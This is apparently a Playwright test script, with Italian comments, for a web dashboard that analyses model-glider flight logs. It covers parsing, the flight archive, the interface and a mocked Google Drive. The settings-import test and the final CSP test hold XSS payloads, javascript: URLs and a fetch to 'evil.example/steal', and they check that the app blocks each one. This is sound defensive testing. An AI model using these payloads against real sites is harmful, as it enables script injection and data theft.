/* Test automatici di RZ Flight Dashboard (Playwright + Chromium).
   Uso:  node tests/run.mjs        (dalla cartella principale; serve Playwright: npm i -g playwright)
   Avvia un piccolo server locale, apre l'app e verifica i casi sui file di esempio. Esce con codice 1 se qualcosa fallisce. */
import { createRequire } from "module";
import crypto from "crypto"; import os from "os";
import http from "http"; import fs from "fs"; import path from "path"; import { fileURLToPath } from "url";
const require = createRequire(process.env.PW_PATH || "/opt/node22/lib/node_modules/");
const { chromium } = require("playwright");
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const mime = { ".html": "text/html", ".js": "text/javascript", ".json": "application/json", ".png": "image/png" };
const srv = http.createServer((q, r) => { const f = path.join(root, q.url === "/" ? "index.html" : decodeURIComponent(q.url.split("?")[0]));
  fs.readFile(f, (e, d) => { if (e) { r.writeHead(404); r.end(); } else { r.writeHead(200, { "content-type": mime[path.extname(f)] || "text/plain" }); r.end(d); } }); });
await new Promise(res => srv.listen(0, res));
const url = "http://localhost:" + srv.address().port + "/";
const E = p => path.join(root, "esempi", p);
let fails = 0; const ok = (c, m) => { console.log((c ? "  ok   " : "  FAIL ") + m); if (!c) fails++; };

// CSP: l'hash dello script inline nella meta deve essere quello attuale (altrimenti l'app resta vuota)
{ const html = fs.readFileSync(path.join(root, "index.html"), "utf8"); const sc = html.match(/<script>([\s\S]*?)<\/script>/)[1];
  const h = "sha256-" + crypto.createHash("sha256").update(sc, "utf8").digest("base64");
  console.log("CSP"); ok(html.includes("'" + h + "'"), "hash dello script aggiornato (se fallisce: python3 tools/csp.py)"); }
const b = await chromium.launch(); const p = await b.newPage({ viewport: { width: 1400, height: 1000 } });
const sub = async (pg, page, id) => { await pg.evaluate(p => document.querySelector(`.rail .tab[data-p="${p}"]`).click(), page); await pg.waitForTimeout(150); await pg.click(`.fi[data-sub="${id}"]`); await pg.waitForTimeout(250); };
const errs = []; p.on("pageerror", e => errs.push(e.message)); p.on("dialog", d => { errs.push("dialog: " + d.message().slice(0, 50)); d.accept(); });
const fresh = async () => { await p.goto(url); await p.waitForTimeout(400); };
const load = async files => { await p.setInputFiles("#file", files); await p.waitForTimeout(1500); };
const text = async sel => (await p.textContent(sel)).replace(/\s+/g, " ");
await p.addInitScript(() => { localStorage.setItem("fd_welcome", "0"); localStorage.setItem("fd_anim", "0"); });
await p.addInitScript(() => document.addEventListener("securitypolicyviolation", e => (window.__v = window.__v || []).push(e.violatedDirective + " | " + e.blockedURI)));
await p.goto(url); await p.waitForTimeout(400);

const jeti = fs.readFileSync(E("volo-completo-test.log"), "latin1");
console.log("NMEA (SM GPS)");
await load(E("volo-completo-test.nmea"));
await p.click('.tab[data-p="po"]'); await p.waitForTimeout(500);
ok(/Sink minimo 0,3\d m\/s/.test(await text("body")), "polare: sink minimo ~0,35 m/s");
await p.click('.tab[data-p="ju"]'); await p.waitForTimeout(400);
const sc = +(await text("#scoreBody")).match(/(\d+) \/100/)[1];
ok(sc >= 40 && sc <= 90, "indice di volo plausibile (" + sc + ")");

console.log("Jeti sintetico");
await fresh();
await load(E("volo-completo-test.log"));
await p.click('.tab[data-p="ju"]'); await p.waitForTimeout(400);
ok(/Regolatore.*Mezon 90/.test(await text("#flightHead")), "assetto: regolatore Mezon 90");
ok(/Modalità di volo/.test(await text("#anaTiles")) && /Termica/.test(await text("#anaTiles")), "fasi di volo da interruttori Sa/Sb");
ok(/Calo qualità collegamento/.test(await text("#radioEv")), "evento radio: calo di Q rilevato");

console.log("Unione Jeti + NMEA");
await fresh();
await load([E("volo-completo-test.log"), E("volo-completo-test.nmea")]);
const fname = await text("#fname"); const m = fname.match(/\(([+-]?[\d,]+) s, r=([\d,]+)\)/);
ok(!!m && Math.abs(parseFloat(m[1].replace(",", ".")) - 37.4) < 0.5, "offset ritrovato ~ +37,4 s (" + (m && m[1]) + ")");
ok(!!m && parseFloat(m[2].replace(",", ".")) > 0.95, "correlazione > 0,95");
await p.click('.tab[data-p="po"]'); await p.waitForTimeout(500);
ok(/Sink minimo/.test(await text("body")), "volo unito: polare disponibile");

console.log("GPS RZ (CSV a 1 Hz)");
await fresh();
await load(E("volo-completo-rzgps.csv"));
ok(/RZ GPS/.test(await text("#flightHead")), "riconosciuto come GPS RZ");
await p.click('.tab[data-p="po"]'); await p.waitForTimeout(500);
ok(/Sink minimo 0,[2-5]\d m\/s/.test(await text("body")), "polare dal CSV 1 Hz (sink minimo plausibile)");
await p.click('.tab[data-p="ju"]'); await p.waitForTimeout(400);
ok(/Quota max|Quota massima/i.test(await text("#anaTiles")), "analisi volo disponibile");
await fresh();
await load([E("volo-completo-test.log"), E("volo-completo-rzgps.csv")]);
ok(/uniti/.test(await text("#fname")), "unione Jeti + GPS RZ");

console.log("Interruttori impostabili");
await p.click("#railSetup"); await p.waitForTimeout(300);
ok(await p.locator("#phRow select").count() === 6, "impostazioni interruttori presenti");

console.log("Esporta / importa impostazioni");
await fresh();
await p.evaluate(() => { localStorage.setItem("fd_mode", "light"); localStorage.setItem("fd_lang", "en");
  localStorage.setItem("jeti_reports", JSON.stringify([{ name: "Mio report", x: "__t__", y: ["Rel. altit", "Vario"], type: "line", colors: ["#112233", null] }])); });
await p.reload(); await p.waitForTimeout(500); await p.click("#railSetup"); await p.waitForTimeout(300); await p.click('.fi[data-sub="bk"]'); await p.waitForTimeout(300);
const [dl] = await Promise.all([p.waitForEvent("download"), p.click("#bkExport")]);
const exp = JSON.parse(fs.readFileSync(await dl.path(), "utf8"));
ok(exp.format === "rz-flight-settings" && exp.data.mode === "light" && exp.data.reports.length === 1 && exp.data.lang === "en", "esportazione: file con impostazioni e report");
const evil = { format: "rz-flight-settings", version: 1, data: { lang: "xx", mode: "dark", map: "javascript:1", logo: "javascript:alert(1)",
  theme: { "--accent": "#ff0000", "--bg": "url(evil)" },
  reports: [{ name: '<img src=x onerror="window.__pwn=1">', x: "__t__", y: ["Vario"], type: "line", colors: ["#00ff00"] },
            { name: "tipo falso", x: "__t__", y: ["Vario"], type: "script" }, { name: 5, x: "a", y: [] }, "stringa"],
  phases: { a: "Comando Sa", low: 9, bOn: 4 } } };
const tmp = path.join(os.tmpdir(), "rz-evil-settings.json"); fs.writeFileSync(tmp, JSON.stringify(evil));
await p.setInputFiles("#bkFile", tmp); await p.waitForTimeout(2500);
const st = await p.evaluate(() => ({ lang: localStorage.getItem("fd_lang"), mode: localStorage.getItem("fd_mode"), map: localStorage.getItem("fd_map"), logo: localStorage.getItem("fd_logo"),
  theme: localStorage.getItem("fd_theme"), rep: JSON.parse(localStorage.getItem("jeti_reports") || "[]"), ph: JSON.parse(localStorage.getItem("fd_phases") || "{}"), pwn: window.__pwn || 0 }));
ok(st.lang === "en" && st.map === null && st.logo === null, "importazione: lingua/mappa/logo non validi scartati");
ok(st.mode === "dark" && st.theme === '{"--accent":"#ff0000"}', "importazione: aspetto valido applicato, colore non valido scartato");
ok(st.rep.length === 1 && st.rep[0].type === "line" && st.rep[0].colors[0] === "#00ff00", "importazione: report malformati scartati, quello valido tenuto");
ok(st.ph.low === 2 && st.ph.bOn === 4 && st.ph.a === "Comando Sa", "importazione: interruttori con valori fuori scala corretti");
await p.click("#railSetup"); await p.waitForTimeout(400);
ok((await p.evaluate(() => window.__pwn || 0)) === 0, "importazione: nome di report con codice non eseguito");
fs.unlinkSync(tmp);

console.log("Archivio (senza cartella)");

await p.evaluate(t => { window.__rz.addFlight(t, "2026-10-01_a.log", "Prova"); window.__rz.addFlight(t, "2026-10-02_b.log", "Prova"); }, jeti);
await p.evaluate(() => document.querySelector('.tab[data-p="ar"]').click()); await p.waitForTimeout(500);
ok(/(Miglior volo registrato|Best recorded flight): \d+/.test(await text("#arBest")), "miglior volo registrato mostrato");
await sub(p,"ar","td");
ok(!(await p.locator("#tdCard").isHidden()), "grafico andamento visibile con 2 voli");

console.log("v1.49: modelli, migliori 10, consumo sul modello");
await sub(p,"ar","md");
ok(/Prova/.test(await text("#mdBody")) && /2 (voli|flights)/.test(await text("#mdBody")), "pagina Modelli: scheda del modello con 2 voli");
await p.click("#mdTabT"); await p.waitForTimeout(200);
ok((await p.locator("#mdBody tbody tr").count()) === 2 && /Prova/.test(await text("#mdBody")), "Migliori 10 voli: tabella con i voli in archivio");
await p.evaluate(t => { window.__rz.addFlight(t, "2026-10-03_c.log", "Prova"); window.__rz.addFlight(t, "2026-10-04_d.log", "Prova"); }, jeti);
await p.click("#mdTabM"); await p.waitForTimeout(200);
await p.evaluate(() => document.querySelector('.tab[data-p="ar"]').click()); await p.waitForTimeout(300);
await sub(p,"ar","ls"); await p.locator("#arList button[data-open]").first().click(); await p.waitForTimeout(800);
await p.click('.tab[data-p="ju"]'); await p.waitForTimeout(500);
ok(/voli dello stesso modello|flights with this model|vols de ce modèle/.test(await text("#scoreBody")), "indice: posizione tra i voli dello stesso modello");

console.log("v1.49: vento dalle termiche, atterraggio, data dal file, stampa");
await p.evaluate(() => localStorage.setItem("fd_lang", "it"));
await fresh();
await load(E("volo-vento-test.nmea"));
await p.click('.tab[data-p="ju"]'); await p.waitForTimeout(500);
{ const tl = await text("#anaTiles"); const w = tl.match(/Vento in quota\s*([\d,]+)\s*m\/s\s*da (\w+)/);
  ok(!!w && Math.abs(parseFloat(w[1].replace(",", ".")) - 4.0) <= 0.5 && w[2] === "NO", "vento stimato dalle termiche ~4 m/s da NO (" + (w ? w[1] + " " + w[2] : "-") + ")");
  ok(/Sink finale/.test(tl) && /Direzione di atterraggio/.test(tl), "atterraggio: sink finale e direzione"); }
ok(/Vento stimato/.test(await text("#verdictText")), "narrativa: paragrafo sul vento");
ok((await p.locator("#thermWrap th").allTextContents()).includes("Vento"), "tabella termiche con la colonna Vento");
await p.click('.tab[data-p="tr"]'); await p.waitForTimeout(900);
await p.click('.tab[data-p="ju"]'); await p.waitForTimeout(300);
await p.emulateMedia({ media: "print" });
ok(await p.evaluate(() => getComputedStyle(document.querySelector(".rail")).display === "none" && getComputedStyle(document.querySelector('section[data-page="ju"]')).display !== "none"), "stampa: solo l'Analisi volo");
await p.emulateMedia({ media: "screen" });
ok(await p.isVisible("#prBtn"), "bottone Stampa / PDF");
await fresh();
await load(E("volo-completo-test.log"));
ok(/data stimata dal file/.test(await text("#flightHead")), "log Jeti senza data: data stimata dal file");

console.log("Animazioni");
{ const p3 = await b.newPage({ viewport: { width: 1400, height: 900 } }); const e3 = [];
  p3.on("pageerror", e => e3.push(e.message)); p3.on("dialog", d => d.accept());
  await p3.addInitScript(() => localStorage.setItem("fd_welcome", "0"));
  await p3.goto(url); await p3.waitForTimeout(400);
  await p3.setInputFiles("#file", [E("volo-completo-test.log"), E("volo-completo-test.nmea")]);
  await p3.waitForTimeout(350);
  const mid = await p3.evaluate(() => [...document.querySelectorAll("#kpis .val")].map(e => e.firstChild.nodeValue).join("|"));
  await p3.waitForTimeout(2600);
  const fin = await p3.evaluate(() => [...document.querySelectorAll("#kpis .val")].map(e => e.firstChild.nodeValue).join("|"));
  ok(mid !== fin, "KPI: i numeri si animano (a metà ≠ finale)");
  ok(/407/.test(fin) && /15:16/.test(fin), "KPI: i valori finali sono esatti (" + fin + ")");
  await p3.click('.tab[data-p="ju"]'); await p3.waitForTimeout(2600);
  ok(/^7\d$/.test(await p3.evaluate(() => document.querySelector(".scorebig").firstChild.nodeValue.trim())), "indice di volo: valore finale esatto dopo l'animazione");
  await p3.click("#railSetup"); await p3.waitForTimeout(200); await p3.click('.fi[data-sub="look"]'); await p3.uncheck("#animOn"); await p3.click('.tab[data-p="ov"]'); await p3.waitForTimeout(150);
  ok(!/^0/.test(await p3.evaluate(() => document.querySelector("#kpis .val").firstChild.nodeValue)), "animazioni disattivate: valori subito finali");
  ok(e3.length === 0, "animazioni: nessun errore" + (e3.length ? ": " + e3.join("|") : ""));
  await p3.close(); }

console.log("v2.0: binario e sottomenu");
{ const p4 = await b.newPage({ viewport: { width: 1400, height: 900 } }); const e4 = [];
  p4.on("pageerror", e => e4.push(e.message)); p4.on("dialog", d => d.accept());
  await p4.addInitScript(() => { localStorage.setItem("fd_welcome", "0"); localStorage.setItem("fd_anim", "0"); });
  await p4.goto(url); await p4.waitForTimeout(400);
  await p4.setInputFiles("#file", [E("volo-completo-test.log"), E("volo-completo-test.nmea")]); await p4.waitForTimeout(1200);
  ok((await p4.locator(".rail .tab").count()) === 7 && (await p4.locator("#railSetup").count()) === 1, "binario: 7 sezioni + Set up");
  ok(/Panoramica/.test(await p4.textContent("#crumb")), "briciole di pane: Panoramica");
  await p4.click('.tab[data-p="ju"]'); await p4.waitForTimeout(500);
  ok(await p4.evaluate(() => document.getElementById("flyout").classList.contains("open")), "Analisi volo: il sottomenu si apre");
  ok((await p4.locator("#flyItems .fi").count()) >= 6, "sottomenu: sotto-pagine presenti");
  ok(await p4.isVisible("#scoreCard") && !(await p4.isVisible("#radioCard")) && !(await p4.isVisible('.card.verdict')), "sotto-pagina Indice: solo l'indice è visibile");
  await p4.click('.fi[data-sub="story"]'); await p4.waitForTimeout(500);
  ok(await p4.isVisible('.card.verdict') && !(await p4.isVisible("#scoreCard")), "sotto-pagina Racconto: visibile solo il racconto");
  ok(/racconto/i.test(await p4.textContent("#crumb")), "briciole di pane aggiornate: " + (await p4.textContent("#crumb")));
  ok(!(await p4.evaluate(() => document.getElementById("flyout").classList.contains("open"))), "il sottomenu si richiude dopo la scelta");
  await p4.click('.tab[data-p="po"]'); await p4.waitForTimeout(300);
  ok(!(await p4.evaluate(() => document.getElementById("flyout").classList.contains("open"))), "sezioni senza sottomenu: nessun pannello");
  await p4.click("#railSetup"); await p4.waitForTimeout(300);
  ok((await p4.getAttribute("#railSetup", "aria-pressed")) === "true" && await p4.isVisible('section[data-page="re"]'), "Set up dal binario");
  ok(e4.length === 0, "binario: nessun errore" + (e4.length ? ": " + e4.join("|") : ""));
  await p4.close(); }

console.log("Welcome page");
{ const p2 = await b.newPage({ viewport: { width: 1400, height: 900 } }); const e2 = [];
  p2.on("pageerror", e => e2.push(e.message)); p2.on("dialog", d => d.accept());
  await p2.addInitScript(() => document.addEventListener("securitypolicyviolation", e => (window.__v = window.__v || []).push(e.violatedDirective + " | " + e.blockedURI)));
  await p2.goto(url); await p2.waitForTimeout(500);
  ok(!(await p2.locator("#welcome").isHidden()) && (await p2.locator(".wk").count()) === 4, "all'avvio compare la welcome page con 4 manopole");
  ok(/v\d+\.\d+/.test(await p2.textContent("#wlVer")), "versione mostrata nella welcome");
  await p2.evaluate(t => { window.__rz.addFlight(t, "2026-10-01_a.log", "ARCUS"); window.__rz.addFlight(t, "2026-10-02_b.log", "ARCUS"); window.__rz.addFlight(t, "2026-10-03_c.log", "PRECISION 2"); }, jeti);
  await p2.waitForTimeout(300);
  ok((await p2.locator("#wlChips .wl-chip").count()) === 2 && !(await p2.locator("#wlLast").isHidden()), "modelli e \"Riprendi\" dall'archivio");
  await p2.click("#wlC2"); await p2.waitForTimeout(500); await p2.click("#wlChips .wl-chip"); await p2.waitForTimeout(400);
  ok((await p2.locator("#welcome").isHidden()) && (await p2.inputValue("#arFModel")) === "ARCUS", "chip del modello: apre l'archivio filtrato");
  await p2.evaluate(() => document.querySelector(".apptitle").click()); await p2.waitForTimeout(200);
  ok(!(await p2.locator("#welcome").isHidden()), "il titolo riporta alla welcome");
  await p2.evaluate(() => { DeviceOrientationEvent.requestPermission = async () => "granted"; }); await p2.click("#wkDial"); await p2.waitForTimeout(200);
  await p2.evaluate(() => { const e = new Event("deviceorientation"); e.beta = 100; e.gamma = 25; window.dispatchEvent(e); });
  ok(/rotate\(-40deg\)/.test(await p2.evaluate(() => document.querySelector("#wkDial .hz").style.transform)), "strumento della welcome: l'orizzonte segue il sensore del telefono");
  await p2.click("#wlC1"); await p2.waitForTimeout(500); await p2.click("#wlDemo"); await p2.waitForTimeout(300);
  ok(await p2.locator("#welcome").isHidden(), "\"Prova con la demo\" entra nell'app");
  await p2.click("#homeBtn"); await p2.waitForTimeout(300);
  ok(!(await p2.locator("#welcome").isHidden()), "pulsante Home: riporta alla pagina iniziale");
  await p2.click("#wlSkip"); await p2.waitForTimeout(200);
  await p2.evaluate(() => document.querySelector(".apptitle").click()); await p2.click("#wlSetup"); await p2.waitForTimeout(300); await p2.click('.fi[data-sub="look"]');
  await p2.uncheck("#wlShow"); await p2.reload(); await p2.waitForTimeout(500);
  ok(await p2.locator("#welcome").isHidden(), "impostazione: welcome disattivabile all'avvio");
  ok(((await p2.evaluate(() => window.__v || [])).length === 0) && e2.length === 0, "welcome: nessun errore né violazione CSP" + (e2.length ? ": " + e2.join("|") : ""));
  await p2.close(); }

console.log("Google Drive (Drive finto)");
{ const files = { root: { id: "root", name: "root", folder: true, parents: [] } }; let n = 0;
  const add = (name, parent, folder, data, type) => { const id = "f" + (++n); files[id] = { id, name, parents: [parent], folder: !!folder, data: data || Buffer.alloc(0), type, mt: new Date(Date.now() - n * 60000).toISOString() }; return id; };
  const dir = add("RZ Dati", "root", true), voli = add("voli", dir, true);
  add("volo-nmea.nmea", voli, false, fs.readFileSync(E("volo-completo-test.nmea")), "text/plain");
  const CORS = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "authorization,content-type", "Access-Control-Allow-Methods": "GET,POST,PATCH,OPTIONS" };
  const handler = async route => {
    const req = route.request(), u = new URL(req.url()), m = req.method();
    const ful = o => route.fulfill({ ...o, headers: { ...CORS, ...(o.headers || {}) } }), json = o => ful({ status: 200, contentType: "application/json", body: JSON.stringify(o) });
    if (m === "OPTIONS") return ful({ status: 204, body: "" });
    if (req.headers()["authorization"] !== "Bearer TOK") return ful({ status: 401, body: "{}" });
    if (m === "GET" && u.pathname === "/drive/v3/files") {
      const q = u.searchParams.get("q"), par = /'([^']+)' in parents/.exec(q)[1], nm = /name='((?:[^'\\]|\\.)*)'/.exec(q);
      const L = Object.values(files).filter(f => f.parents.includes(par) && (!nm || f.name === nm[1].replace(/\\(.)/g, "$1")) && (/mimeType!=/.test(q) ? !f.folder : (/vnd\.google-apps\.folder/.test(q) ? f.folder : true)));
      return json({ files: L.map(f => ({ id: f.id, name: f.name, size: String(f.data.length), modifiedTime: f.mt })) }); }
    if (m === "POST" && u.pathname === "/drive/v3/files") { const bd = JSON.parse(req.postData()); return json({ id: add(bd.name, bd.parents[0], true) }); }
    let r = /^\/drive\/v3\/files\/([^/]+)$/.exec(u.pathname);
    if (m === "GET" && r) { const f = files[r[1]]; return ful({ status: 200, contentType: "application/octet-stream", body: f.data }); }
    r = /^\/upload\/drive\/v3\/files\/([^/]+)$/.exec(u.pathname);
    if (m === "PATCH" && r) { files[r[1]].data = req.postDataBuffer(); return json({ id: r[1] }); }
    r = /^\/drive\/v3\/files\/([^/]+)$/.exec(u.pathname);
    if (m === "PATCH" && r) { const bd = JSON.parse(req.postData() || "{}"); if (bd.trashed) files[r[1]].parents = []; return json({ id: r[1] }); }
    if (m === "POST" && u.pathname === "/upload/drive/v3/files") {
      const buf = req.postDataBuffer(), bd = /boundary=(\S+)/.exec(req.headers()["content-type"])[1], st = buf.toString("latin1");
      const p1 = st.indexOf("\r\n\r\n") + 4, e1 = st.indexOf("\r\n--" + bd, p1), meta = JSON.parse(st.slice(p1, e1));
      const h2 = st.indexOf("\r\n\r\n", e1) + 4, e2 = st.lastIndexOf("\r\n--" + bd + "--");
      return json({ id: add(meta.name, meta.parents[0], false, Buffer.from(st.slice(h2, e2), "latin1"), "text/plain") }); }
    return ful({ status: 400, body: "?" }); };
  const c3 = await b.newContext({ viewport: { width: 1400, height: 1000 }, serviceWorkers: "block" }); const p3 = await c3.newPage(); const e3 = [];
  p3.on("pageerror", e => e3.push(e.message)); p3.on("dialog", d => d.dismiss());
  await p3.addInitScript(() => localStorage.setItem("fd_welcome", "0"));
  await p3.addInitScript(() => document.addEventListener("securitypolicyviolation", e => (window.__v = window.__v || []).push(e.violatedDirective + " | " + e.blockedURI)));
  await p3.route("https://www.googleapis.com/**", handler);
  await p3.route("https://accounts.google.com/**", r => r.fulfill({ status: 200, contentType: "text/html", body: "google" }));
  await p3.goto(url); await p3.waitForTimeout(400);
  await p3.evaluate(() => document.querySelector("#miDrive").click()); await p3.waitForTimeout(200);
  ok(!(await p3.locator("#drvConnect").isHidden()) && /Non collegato/.test(await p3.textContent("#drvSt")), "Drive: non collegato, bottone Collega visibile");
  const [rq] = await Promise.all([p3.waitForRequest(/accounts\.google\.com/), p3.click("#drvConnect")]);
  const au = new URL(rq.url());
  ok(au.searchParams.get("redirect_uri") === url && au.searchParams.get("response_type") === "token" && /googleusercontent\.com$/.test(au.searchParams.get("client_id")), "Drive: richiesta a Google con redirect e client giusti");
  await p3.goto(url + "#access_token=TOK&expires_in=3599&token_type=Bearer&state=" + au.searchParams.get("state")); await p3.waitForTimeout(1200);
  ok(!(await p3.evaluate(() => location.hash)) && (await p3.locator("#drvOverlay.open").count()) === 1, "Drive: ritorno da Google, token tolto dall'indirizzo e finestra riaperta");
  ok((await p3.locator(".drvrow").count()) === 1 && /1 log/.test(await p3.textContent("#drvSt")), "Drive: elenco dei log della cartella RZ Dati/voli");
  await p3.click(".drvrow"); await p3.waitForTimeout(1500);
  ok(/volo-nmea\.nmea/.test(await p3.textContent("#fname")) && (await p3.locator("#drvOverlay.open").count()) === 0, "Drive: un tocco apre il log");
  await p3.setInputFiles("#file", E("volo-completo-test.log")); await p3.waitForTimeout(1500);
  await p3.evaluate(() => document.querySelector("#miDrive").click()); await p3.waitForTimeout(600);
  ok(/volo-completo-test\.log/.test(await p3.textContent("#drvUp")), "Drive: proposto il salvataggio del file aperto");
  await p3.click("#drvUp"); await p3.waitForTimeout(1500);
  const up = Object.values(files).find(f => f.name === "volo-completo-test.log");
  ok(!!up && up.data.equals(fs.readFileSync(E("volo-completo-test.log"))), "Drive: log caricato identico all'originale");
  ok((await p3.locator(".drvrow").count()) === 2, "Drive: elenco aggiornato dopo il salvataggio");
  // archivio sul Drive: salva (solo Drive), ricarica, elimina
  await p3.click("#drvClose"); await p3.evaluate(() => document.querySelector('.tab[data-p="ar"]').click()); await p3.waitForTimeout(500);
  await sub(p3,"ar","fold"); if (await p3.isChecked("#arToPc")) await p3.uncheck("#arToPc");
  await p3.check("#arToDrv"); await p3.fill("#arModel", "Prova Drive"); await p3.click("#arSave"); await p3.waitForTimeout(1500);
  const rzf = Object.values(files).filter(f => f.name.endsWith(".rzf.json") && f.parents.length);
  ok(rzf.length === 1 && JSON.parse(rzf[0].data.toString("utf8")).model === "Prova Drive", "Archivio: volo salvato sul Drive (.rzf.json con il modello)");
  ok((await p3.locator("#arList td.where").count()) === 1 && /☁/.test(await p3.textContent("#arList")), "Archivio: il volo compare con il segno ☁");
  await p3.reload(); await p3.waitForTimeout(800); await p3.evaluate(() => document.querySelector('.tab[data-p="ar"]').click()); await p3.waitForTimeout(1500);
  ok(/Prova Drive/.test(await p3.textContent("#arList")) && /RZ Dati \/ voli · 1/.test(await p3.textContent("#arFolder")), "Archivio: dopo il riavvio i voli del Drive si rileggono da soli");
  p3.removeAllListeners("dialog"); p3.on("dialog", d => d.accept());
  await sub(p3,"ar","ls"); await p3.click("#arList button[data-del]"); await p3.waitForTimeout(1000);
  ok(rzf[0].parents.length === 0 && (await p3.locator("#arList td.where").count()) === 0, "Archivio: Elimina sposta il volo nel cestino del Drive");
  ok(((await p3.evaluate(() => window.__v || [])).length === 0) && e3.length === 0, "Drive: nessun errore né violazione CSP" + (e3.length ? ": " + e3.join("|") : ""));
  await c3.close(); }

const viol = await p.evaluate(() => window.__v || []);
ok(viol.length === 0, "nessuna violazione della CSP nell'uso normale" + (viol.length ? ": " + viol.join(" | ") : ""));
await p.evaluate(() => { window.__v = []; window.__pwn = 0;
  document.body.insertAdjacentHTML("beforeend", '<img src=x onerror="window.__pwn=1">');
  const s = document.createElement("script"); s.textContent = "window.__pwn=2"; document.body.appendChild(s);
  const e = document.createElement("script"); e.src = "https://evil.example/x.js"; document.body.appendChild(e);
  fetch("https://evil.example/steal").catch(() => {}); });
await p.waitForTimeout(500);
ok((await p.evaluate(() => window.__pwn)) === 0, "CSP: gestore inline e script iniettato non vengono eseguiti");
ok((await p.evaluate(() => window.__v)).length >= 3, "CSP: blocca script inline, script esterno e richieste verso altri siti");
ok(errs.length === 0, "nessun errore JavaScript" + (errs.length ? ": " + errs.join(" | ") : ""));
await b.close(); srv.close();
console.log(fails ? `\n${fails} test FALLITI` : "\nTutti i test superati"); process.exit(fails ? 1 : 0);
